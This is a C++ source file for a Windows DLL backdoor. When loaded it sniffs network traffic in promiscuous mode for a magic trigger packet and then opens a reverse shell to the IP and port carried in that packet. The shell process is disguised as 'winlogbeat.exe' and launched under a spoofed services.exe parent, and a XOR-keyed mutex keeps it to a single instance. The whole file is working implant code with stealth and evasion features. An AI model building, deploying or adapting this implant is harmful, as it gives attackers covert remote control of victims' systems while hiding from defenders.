// RawDLL.cpp : Triggers based off a src & dst port pairing and sends a reverse shell

#define _WIN32_WINNT 0x6000
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <mstcpip.h>
#include <WS2tcpip.h>
#include <time.h>
#include <string>
#include "Jade.h"


#define EXPORT __declspec(dllexport)

// required for winsock2
#pragma comment(lib,"Ws2_32")

// define the const maximum size of a receive packet
constexpr auto MAX_PACKET_SIZE = 65535;

// struct for the ip header data
typedef struct _IP_HEADER_
{
	BYTE ver_ihl;
	BYTE type;
	WORD length;
	WORD packet_id;
	WORD flags_foff;
	BYTE ttl;
	BYTE proto;
	WORD hdr_chksum;
	DWORD src_ip;
	DWORD dst_ip;
} IPHEADER;

// struct for the tcp header data
typedef struct _TCP_HEADER_
{
	WORD sport;
	WORD dport;
	DWORD seq;
	DWORD ack;
	WORD info_ctl;
	WORD window;
	WORD checksum;
	WORD urgent;
} TCPHEADER;

typedef struct _UDP_HEADER_
{
	WORD source;
	WORD dest;
	WORD length;
	WORD checksum;
} UDPHEADER;

// custom struct for the callback data
struct CDATA
{
	unsigned char head[2];
	unsigned char port[2];
	unsigned char addr[4];
	unsigned char tail[4];
};

// prototypes
void	reverse_shell(unsigned int IP_ADDR, unsigned short PORT);
int		start_listener(void);


/* Function that establishes a reverse shell socket and then
	hands it off to the newly created process.*/
void
reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
{
	srand(time(NULL));
	
	// Generate random hex chars for the beginning portion of the "GUID" prepend with '{'
	char first[10];
	first[0] = '{';
	for (int i = 1; i < 9; i++) {
		sprintf(first + i, "%x", (rand() ^ 0xe) % 16);
	}
	first[9] = '\0';
	
	// Convert hex to char for the two halves of the IP_ADDR portion of the "GUID"
	char ip_high[5];
	char ip_low[5];
	sprintf(ip_high, "%04x", ((IP_ADDR >> 16) & 0xffff));
	sprintf(ip_low, "%04x", IP_ADDR & 0xffff);

	// Convert hex to char for the PORT portion of the "GUID"
	char sport[5];
	sprintf(sport, "%04x", PORT);

	// Generate random hex chars for the last section of the "GUID" append with '}'
	char last[14];
	for (int i = 0; i < 12; i++) {
		sprintf(last + i, "%x", (rand() ^ 0x3) % 16);
	}
	last[12] = '}';
	last[13] = '\0';

	const size_t size = 256 + strlen(first) + strlen(ip_high) + strlen(ip_low) + strlen(sport) + strlen(last) + 5;

	char *cmdbuff = new char[size];

	strcpy(cmdbuff, "winlogbeat.exe ");
	strcat(cmdbuff, first);
	strcat(cmdbuff, "-");
	strcat(cmdbuff, ip_high);
	strcat(cmdbuff, "-");
	strcat(cmdbuff, ip_low);
	strcat(cmdbuff, "-");
	strcat(cmdbuff, sport);
	strcat(cmdbuff, "-");
	strcat(cmdbuff, last);

	const char parent[] = "services.exe";

	SpoofParent(cmdbuff, parent);
	delete cmdbuff;
	
}

/* Starts the Raw Socket Listener that waits for the specified
	trigger mechanism. This then retrieves the callback info
	and calls the reverse shell.*/
int
start_listener(void)
{
	SOCKET sock = INVALID_SOCKET;
	IPHEADER* ip_header = NULL;
	TCPHEADER* tcp_hdr = NULL;
	UDPHEADER* udp_hdr = NULL;
	struct CDATA* cdata = NULL;
	WSADATA wsaData;
	DWORD dwFlags = WSA_FLAG_OVERLAPPED;
	DWORD dwLen = 0;
	int wsaResult = 0;
	int optval = RCVALL_IPLEVEL;
	int bytes = 0;
	char* packet;

	// Required in order to initialize and gain access to winsock.dll
	wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsaResult != 0)
		return -1;

	// create a raw socket 
	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, dwFlags);
	if (sock == INVALID_SOCKET)
		return -1;

	char* localip = (char*)malloc(sizeof(20));
	memset(localip, 0x0, sizeof(localip));
	DWORD err = GetLocalIP(localip);
	if (err != 0)
		return -1;

	sockaddr_in sniffer;
	sniffer.sin_family = AF_INET;
	sniffer.sin_port = htons(0);
	sniffer.sin_addr.s_addr = inet_addr(localip);
	free(localip);

	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR) 
		return -1;
	

	// this function sets the interface to promiscuous mode
	if (WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwLen, NULL, NULL) == SOCKET_ERROR)
		goto close;

	// enter listener while loop and call reverse_shell on trigger
	while (TRUE)
	{
		// allocate memory in the heap for handling each packet at a time
		if ((packet = (char*)malloc(sizeof(char) * MAX_PACKET_SIZE)) == NULL)
			goto close;

		memset(packet, 0x0a, (sizeof(char) * MAX_PACKET_SIZE));

		if ((bytes = recv(sock, packet, MAX_PACKET_SIZE, 0)) == SOCKET_ERROR)
			break;

		ip_header = (IPHEADER*)packet;

		// handle the TCP packets
		if (ip_header->proto == 6) {

			//int iphdr_len = (ip_header->ver_ihl & 0xf) * sizeof(DWORD);
			int iphdr_len = 20;
			tcp_hdr = (TCPHEADER*)(packet + iphdr_len);
			cdata = (struct CDATA*)(packet + iphdr_len + 20);

			unsigned int head = cdata->head[0] << 8;
			head += cdata->head[1];

			unsigned int tail = cdata->tail[0] << 24;
			tail += cdata->tail[0] << 16;
			tail += cdata->tail[2] << 8;
			tail += cdata->tail[3];

			// Trigger based off of a source and destination port pairing
			if (((head * 0xdead) % 0xbeef) == tail) {
				
				unsigned short port;
				unsigned int   ip;

				//bit shifting to build the return port/IP
				port = (cdata->port[0] << 8) + (cdata->port[1]);
				ip = (cdata->addr[0] << 24);
				ip += (cdata->addr[1] << 16);
				ip += (cdata->addr[2] << 8);
				ip += (cdata->addr[3]);

				if (port == 0 || cdata->head == 0 || cdata->tail == 0)
					continue;

				free(packet);
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				reverse_shell(ip, port);

				return 0;
				
			}
		}
		else if (ip_header->proto == 17) {

			int iphdr_len = (ip_header->ver_ihl & 0xf) * sizeof(DWORD);
			udp_hdr = (UDPHEADER*)(packet + iphdr_len);
			cdata = (struct CDATA*)(packet + iphdr_len + sizeof(UDPHEADER));

			unsigned int head = cdata->head[0] << 8;
			head += cdata->head[1];

			unsigned int tail = cdata->tail[0] << 24;
			tail += cdata->tail[0] << 16;
			tail += cdata->tail[2] << 8;
			tail += cdata->tail[3];

			// Trigger based off of a source and destination port pairing
			if (((head * 0xdead) % 0xbeef) == tail) {
				
				unsigned short port;
				unsigned int   ip;

				//bit shifting to build the return port/IP
				port = (cdata->port[0] << 8) + (cdata->port[1]);
				ip = (cdata->addr[0] << 24);
				ip += (cdata->addr[1] << 16);
				ip += (cdata->addr[2] << 8);
				ip += (cdata->addr[3]);

				if (port == 0 || cdata->head == 0 || cdata->tail == 0)
					continue;

				free(packet);
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				reverse_shell(ip, port);

				return 0;
				
			}

		}
		free(packet);
	}
	free(packet);
close:
	shutdown(sock, SD_BOTH);
	closesocket(sock);

	return -1;
}

extern "C" EXPORT DWORD WINAPI 
Run(LPVOID lpThreadAttributes)
{
	int err = 0;
	HANDLE mutex;
	char xorkey[4] = { 'J', 'A', 'N', 'K' };
	mutex = XOR_Mutex(xorkey);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return 0;

	while (TRUE) {

		err = start_listener();
		// if we have an error in the program, wait 30 seconds and try again
		if (err == -1)
			Sleep(30000);
	}
	return 0;
}

int
main()
{
	Run(NULL);
	return 0;
}

BOOL APIENTRY 
DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE hThread;
    switch (ul_reason_for_call)
    {
	// Spawns the listener on DLL load. CloseHandle ensures the program can continue
	// without hanging and the new thread continues in the background
    case DLL_PROCESS_ATTACH:
		hThread = CreateThread(NULL, 0, Run, NULL, 0, NULL);
		if (hThread != NULL)
			CloseHandle(hThread);

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

